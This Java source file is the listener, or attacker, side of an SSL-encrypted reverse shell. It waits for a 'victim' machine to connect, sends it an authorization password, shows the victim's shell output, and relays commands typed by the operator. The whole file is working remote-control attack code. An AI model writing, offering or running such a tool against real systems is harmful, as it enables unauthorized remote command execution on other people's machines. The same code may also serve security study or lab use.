package shell;

import javax.net.ssl.*;
import java.io.*;
import java.util.Scanner;

public class Attacker {
    public static void main(String[] args) {
        if (args.length < 2) {
            System.out.println("Usage: java shell.Attacker <port> <auth_password>");
            return;
        }

        int port = Integer.parseInt(args[0]);
        String authPassword = args[1];

        try {
            // 1. Get the SSL Socket Factory from our Helper (Generates cert in-memory)
            SSLServerSocketFactory ssf = SSLHelper.createSSLContext();

            try (SSLServerSocket serverSocket = (SSLServerSocket) ssf.createServerSocket(port)) {
                System.out.println("[*] Secure Listener started on port " + port);
                System.out.println("[*] Waiting for victim connection...");

                // 2. Accept connection
                SSLSocket client = (SSLSocket) serverSocket.accept();
                System.out.println("[+] Victim connected: " + client.getInetAddress());

                // 3. Set up streams
                PrintWriter out = new PrintWriter(client.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));

                // 4. Send the password to the victim for authorization
                System.out.println("[*] Sending authorization password...");
                out.println(authPassword);

                // 5. Start a thread to read the shell output from the victim
                Thread readerThread = new Thread(() -> {
                    try {
                        String line;
                        while ((line = in.readLine()) != null) {
                            System.out.println(line);
                        }
                    } catch (IOException e) {
                        System.out.println("\n[!] Connection closed by victim.");
                    }
                });
                readerThread.start();

                // 6. Main loop: Read commands from Attacker's keyboard and send to Victim
                Scanner terminalInput = new Scanner(System.in);
                System.out.println("[*] Shell ready. Type commands below:");

                while (terminalInput.hasNextLine()) {
                    String command = terminalInput.nextLine();
                    out.println(command);

                    if (command.equalsIgnoreCase("exit")) {
                        break;
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("[!] Server Error: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
